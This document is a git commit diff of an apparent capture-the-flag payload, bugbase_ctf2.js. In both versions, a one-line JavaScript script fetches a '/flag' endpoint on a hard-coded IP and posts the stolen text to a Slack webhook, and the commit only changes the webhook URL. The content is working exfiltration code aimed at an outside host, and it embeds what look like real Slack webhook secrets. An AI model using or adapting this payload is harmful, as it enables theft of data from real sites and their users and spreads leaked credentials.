e4c59e0c6ac9ecd6aff3311e707760a6139b3371
Kartik Singh <kartiksingh00013@gmail.com>
2023-03-16 18:51:16 +0530

    Update bugbase_ctf2.js

--- bugbase_ctf2.js
+++ bugbase_ctf2.js
@@ -1,2 +1,2 @@
 const url = "http://165.232.190.5:2030/flag";
-fetch(url).then((response) => response.text()).then((text) => fetch("https://hooks.slack.com/services/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", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"text":text})}));
+fetch(url).then((response) => response.text()).then((text) => fetch("https://hooks.slack.com/services/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", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"text":text})}));
